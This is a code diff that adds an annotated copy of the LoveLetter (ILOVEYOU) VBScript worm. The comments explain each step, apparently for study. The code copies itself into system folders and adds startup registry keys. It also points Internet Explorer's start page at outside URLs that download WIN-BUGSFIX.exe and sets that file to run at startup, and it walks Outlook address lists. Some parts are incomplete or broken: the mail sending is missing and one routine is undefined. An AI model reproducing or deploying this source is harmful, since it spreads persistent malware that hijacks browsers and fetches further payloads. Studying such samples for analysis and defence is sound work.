@@ -1,0 +1,203 @@
+rem  barok -loveletter(vbe) <i hate go to school>
+rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
+On Error Resume Next
+
+rem Setup global variables to be used throughout subroutines and functions.
+Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
+eq = ""
+ctr = 0
+
+rem Open the current script file and define "vbscopy" which can be used to
+rem read its own contents. Used to replicate itself in other files.
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
+vbscopy = file.ReadAll
+
+main()
+
+rem Subroutine to initalize the program
+Sub main()
+  On Error Resume Next
+  Dim wscr, rr
+
+  rem Creates a shell which will be used to read the registry.
+  Set wscr = CreateObject("WScript.Shell")
+  rem Gets a registry key which indicates the scripting time-out from Windows.
+  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
+
+  rem Checks if the current timeout is more than 0.
+  If (rr >= 1) Then
+    rem Sets the timeout to 0, effectively making it so that the script won't
+    rem time out, incase the system happens to be too slow to execute it.
+    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
+  End If
+
+  rem Finds special folders, such as system, temporary and windows folders.
+  Set dirwin = fso.GetSpecialFolder(0)
+  Set dirsystem = fso.GetSpecialFolder(1)
+  Set dirtemp = fso.GetSpecialFolder(2)
+  Set c = fso.GetFile(WScript.ScriptFullName)
+
+  rem Copy itself into VBScript files MSKernel32.vbs, Win32DLL.vbs and
+  rem LOVE-LETTER-FOR-YOU.TXT.vbs
+  c.Copy(dirsystem & "\MSKernel32.vbs")
+  c.Copy(dirwin & "\Win32DLL.vbs")
+  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+
+  rem Call the other subroutines.
+  regruns()
+  spreadtoemail()
+  listadriv()
+End Sub
+
+rem Subroutine to create and update special registry values.
+Sub regruns()
+  On Error Resume Next
+  Dim num, downread
+
+  rem Set the system to automatically run MSKernel32.vbs and Win32DLL.vbs on startup.
+  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
+  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"
+
+  rem Get internet Explorer's download directory.
+  downread = ""
+  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
+
+  rem If the directory wasn't found, then use C:\ drive as the download directory.
+  If (downread = "") Then
+    downread = "c:\"
+  End If
+
+  rem Check if a file named "WinFAT32.exe" exists in the system files.
+  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
+    Randomize
+
+    rem Generate a random number from 1 to 4.
+    num = Int((4 * Rnd) + 1)
+
+    rem Randomly update the Internet Explorer's start page that leads to a
+    rem page that will download a malicious executable "WIN-BUGSFIX.exe".
+    If num = 1 Then
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
+    ElseIf num = 2 Then
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
+    ElseIf num = 3 Then
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
+    ElseIf num = 4 Then
+      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
+    End If
+  End If
+
+  rem Check if the "WIN-BUGSFIX.exe" file exists in the download directory.
+  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
+    rem Add WIN-BUGSFIX.exe to run on startup
+    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
+    rem Update Internet Explorer's start page to "about:blank"
+    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
+  End If
+End Sub
+
+rem Subroutine to list folders in drives.
+Sub listadriv()
+  On Error Resume Next
+  Dim d, dc, s
+
+  Set dc = fso.Drives
+
+  For Each d In dc
+    If (d.DriveType = 2) Or (d.DriveType = 3) Then
+      folderlist(d.path & "\")
+    End If
+  Next
+
+  listadriv = s
+End Sub
+
+rem Subroutine used to create/write registry entries.
+Sub regcreate(regkey,regvalue)
+  Set regedit = CreateObject("WScript.Shell")
+  regedit.RegWrite regkey, regvalue
+End Sub
+
+rem Subroutine used to get registry entries.
+Function regget(value)
+  Set regedit = CreateObject("WScript.Shell")
+  regget = regedit.RegRead(value)
+End Function
+
+rem Function to check if a file exists.
+Function fileexist(filespec)
+  On Error Resume Next
+  Dim msg
+
+  If (fso.FileExists(filespec)) Then
+    msg = 0
+  Else
+    msg = 1
+  End If
+
+  fileexist = msg
+End Function
+
+rem Function to check if a folder exists.
+Function folderexist(folderspec)
+  On Error Resume Next
+  Dim msg
+
+  If (fso.GetFolderExists(folderspec)) Then
+    msg = 0
+  Else
+    msg = 1
+  End If
+
+  fileexist = msg
+End Function
+
+rem Subroutine to send emails to the user's contacts through MAPI
+rem (Messaging Application Programming Interface), the API used by Outlook to
+rem communicate with the Microsoft Exchange Server which also hosts calendars
+rem and address book.
+Sub spreadtoemail()
+  On Error Resume Next
+  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
+
+  rem Creates a shell to edit the registry.
+  Set regedit = CreateObject("WScript.Shell")
+  rem Creates a new Outlook application object instance, to access the MAPI.
+  Set out = WScript.CreateObject("Outlook.Application")
+  rem Gets the MAPI namespace used to access the address book lists.
+  Set mapi = out.GetNameSpace("MAPI")
+
+  rem Goes through all contacts in the address book and sends an email
+  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
+  For ctrlists = 1 To mapi.AddressLists.Count
+    Set a = mapi.AddressLists(ctrlists)
+    x = 1
+    rem Gets a registry key that is used to check who has been sent an email,
+    rem already to ensure that even if there may be duplicate contacts, it will
+    rem only send the email once to the same address.
+    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
+
+    If (regv = "") Then
+      regv = 1
+    End If
+
+    If (int(a.AddressEntries.Count) > int(regv)) Then
+      rem Iterates over each entry in the address list.
+      For ctrentries = 1 To a.AddressEntries.Count
+        malead = a.AddressEntries(x)
+        regad = ""
+        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )
+        regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
+        x = x + 1
+      Next
+
+      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
+    Else
+      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
+    End If
+  Next
+
+  Set out = Nothing
+  Set mapi = Nothing
+End Sub
